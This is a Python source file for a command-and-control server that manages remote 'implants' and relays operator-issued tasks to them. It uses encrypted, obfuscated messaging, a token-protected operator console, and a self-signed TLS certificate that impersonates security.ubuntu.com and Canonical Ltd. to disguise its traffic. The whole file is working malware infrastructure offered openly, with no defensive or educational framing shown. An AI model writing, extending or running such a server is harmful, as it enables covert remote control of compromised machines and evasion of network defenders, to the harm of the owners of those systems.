#!/usr/bin/env python3
import datetime
import json
import logging
import os
import queue
import socket
import ssl
import struct
import tempfile
import threading
import uuid

from helper import (
    decrypt_message,
    deobfuscate,
    deserialize_public_key,
    encrypt_message,
    generate_keypair,
    obfuscate,
    serialize_public_key,
)

IMPLANT_HOST = "0.0.0.0"
IMPLANT_PORT = int(os.environ.get("C2_PORT", "9999"))
OPERATOR_HOST = "0.0.0.0"  # Docker port mapping restricts to localhost externally
OPERATOR_PORT = int(os.environ.get("C2_OPERATOR_PORT", "9998"))
OPERATOR_TOKEN = os.environ.get("OPERATOR_TOKEN", "changeme")

_log_path = os.environ.get("C2_LOG", "c2.log")
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(_log_path, encoding="utf-8"),
    ],
)
log = logging.getLogger("c2")


def _make_tls_context():
    """Ephemeral self-signed TLS cert - generated at startup, never written to disk long-term."""
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa as _rsa

    priv = _rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, u"security.ubuntu.com"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"Canonical Ltd."),
    ])
    cert = (
        x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(name)
        .public_key(priv.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.utcnow())
        .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
        .sign(priv, hashes.SHA256())
    )
    cf = tempfile.NamedTemporaryFile(delete=False, suffix=".crt")
    kf = tempfile.NamedTemporaryFile(delete=False, suffix=".key")
    cf.write(cert.public_bytes(serialization.Encoding.PEM))
    kf.write(priv.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption(),
    ))
    cf.close()
    kf.close()
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cf.name, kf.name)
    os.unlink(cf.name)
    os.unlink(kf.name)
    return ctx


def _send(conn, data):
    conn.sendall(struct.pack(">I", len(data)) + data)


def _recv(conn):
    hdr = b""
    while len(hdr) < 4:
        c = conn.recv(4 - len(hdr))
        if not c:
            raise ConnectionError("closed")
        hdr += c
    length = struct.unpack(">I", hdr)[0]
    buf = b""
    while len(buf) < length:
        c = conn.recv(length - len(buf))
        if not c:
            raise ConnectionError("closed")
        buf += c
    return buf


class ImplantSession(object):
    def __init__(self, implant_id, conn, priv_key, imp_pub, info):
        self.implant_id = implant_id
        self.conn = conn
        self.priv_key = priv_key
        self.imp_pub = imp_pub
        self.info = info
        self.task_queue = queue.Queue()

    def _push(self, command, payload):
        req = {
            "type": "REQUEST",
            "command": command,
            "request_id": str(uuid.uuid4()),
            "payload": payload,
        }
        _send(self.conn, obfuscate(encrypt_message(json.dumps(req).encode(), self.imp_pub)))
        raw = _recv(self.conn)
        return json.loads(decrypt_message(deobfuscate(raw), self.priv_key).decode())


_sessions = {}
_sessions_lock = threading.Lock()


def _handle_implant(conn, addr):
    priv_key, pub_key = generate_keypair()
    session = None
    try:
        imp_pub = deserialize_public_key(_recv(conn))
        _send(conn, serialize_public_key(pub_key))

        raw = _recv(conn)
        msg = json.loads(decrypt_message(deobfuscate(raw), priv_key).decode())
        info = msg.get("payload", {})

        implant_id = "IMP-" + str(uuid.uuid4())[:8].upper()
        session = ImplantSession(implant_id, conn, priv_key, imp_pub, info)

        ack = {
            "type": "RESPONSE",
            "command": "REGISTER",
            "request_id": msg.get("request_id", ""),
            "status": "OK",
            "payload": {"implant_id": implant_id},
        }
        _send(conn, obfuscate(encrypt_message(json.dumps(ack).encode(), imp_pub)))

        with _sessions_lock:
            _sessions[implant_id] = session
        log.info("+ IMPLANT  %s  %s", implant_id, info)

        while True:
            command, payload, result_q = session.task_queue.get()
            if command is None:
                break
            try:
                result = session._push(command, payload)
                log.info("  TASK     %s  %s  OK", implant_id, command)
                if command in ("SHUTDOWN", "DESTROY"):
                    with _sessions_lock:
                        _sessions.pop(implant_id, None)
                    result_q.put({"status": "ok", "result": result})
                    break
                result_q.put({"status": "ok", "result": result})
            except (ConnectionError, OSError, BrokenPipeError) as exc:
                log.info("  TASK     %s  %s  SOCKET_DEAD %s", implant_id, command, exc)
                if command in ("SHUTDOWN", "DESTROY"):
                    with _sessions_lock:
                        _sessions.pop(implant_id, None)
                    result_q.put({"status": "ok", "result": {"type": "RESPONSE", "payload": {"message": "implant disconnected"}}})
                else:
                    result_q.put({"status": "error", "message": "socket closed: {0}".format(exc)})
                break
            except Exception as exc:
                log.info("  TASK     %s  %s  ERR %s", implant_id, command, exc)
                result_q.put({"status": "error", "message": str(exc)})

    except Exception as exc:
        log.info("! IMPLANT  %s  error: %s", addr, exc)
    finally:
        with _sessions_lock:
            dead = [k for k, v in list(_sessions.items()) if v.conn is conn]
            for k in dead:
                _sessions.pop(k, None)
                log.info("- IMPLANT  %s  disconnected", k)
        conn.close()


def _handle_operator(conn, addr):
    try:
        raw = _recv(conn)
        msg = json.loads(raw.decode())
        if msg.get("action") != "AUTH" or msg.get("token") != OPERATOR_TOKEN:
            _send(conn, json.dumps({"status": "error", "message": "Unauthorized"}).encode())
            log.info("! OPERATOR %s  AUTH FAILED", addr)
            return
        _send(conn, json.dumps({"status": "ok", "message": "Authenticated"}).encode())
    except Exception as exc:
        log.info("! OPERATOR %s  auth error: %s", addr, exc)
        conn.close()
        return

    log.info("+ OPERATOR %s", addr)
    try:
        while True:
            raw = _recv(conn)
            if not raw:
                break
            msg = json.loads(raw.decode())
            action = msg.get("action", "")

            if action == "LIST":
                with _sessions_lock:
                    result = {
                        "status": "ok",
                        "implants": {iid: s.info for iid, s in _sessions.items()},
                    }
                log.info("  LIST     %s  %d implants", addr, len(result["implants"]))

            elif action == "TASK":
                target_id = msg.get("target", "")
                command = msg.get("command", "")
                payload = msg.get("payload", {})

                with _sessions_lock:
                    session = _sessions.get(target_id)

                if session is None:
                    result = {
                        "status": "error",
                        "message": "Implant '{0}' not connected".format(target_id),
                    }
                else:
                    rq = queue.Queue()
                    session.task_queue.put((command, payload, rq))
                    try:
                        result = rq.get(timeout=30)
                    except queue.Empty:
                        result = {"status": "error", "message": "Implant timed out (30s)"}

            else:
                result = {
                    "status": "error",
                    "message": "Unknown action: {0!r}".format(action),
                }

            _send(conn, json.dumps(result).encode())

    except ConnectionError:
        pass
    except Exception as exc:
        log.info("! OPERATOR %s  error: %s", addr, exc)
    finally:
        conn.close()
        log.info("- OPERATOR %s  disconnected", addr)


def _implant_listener(tls_ctx):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((IMPLANT_HOST, IMPLANT_PORT))
    srv.listen()
    log.info("LISTEN  implants  %s:%d  (TLS)", IMPLANT_HOST, IMPLANT_PORT)
    while True:
        conn, addr = srv.accept()
        try:
            tls_conn = tls_ctx.wrap_socket(conn, server_side=True)
        except ssl.SSLError as exc:
            log.info("! TLS handshake failed %s: %s", addr, exc)
            conn.close()
            continue
        threading.Thread(target=_handle_implant, args=(tls_conn, addr), daemon=True).start()


def _operator_listener():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((OPERATOR_HOST, OPERATOR_PORT))
    srv.listen()
    log.info("LISTEN  operators %s:%d  (token auth required)", OPERATOR_HOST, OPERATOR_PORT)
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=_handle_operator, args=(conn, addr), daemon=True).start()


if __name__ == "__main__":
    log.info("C2 server starting  log=%s  token=%s", _log_path, OPERATOR_TOKEN)
    tls_ctx = _make_tls_context()
    log.info("TLS ready  (ephemeral cert, CN=security.ubuntu.com)")
    t1 = threading.Thread(target=_implant_listener, args=(tls_ctx,), daemon=True)
    t2 = threading.Thread(target=_operator_listener, daemon=True)
    t1.start()
    t2.start()
    log.info("Ready.")
    try:
        t1.join()
    except KeyboardInterrupt:
        log.info("Shutdown.")
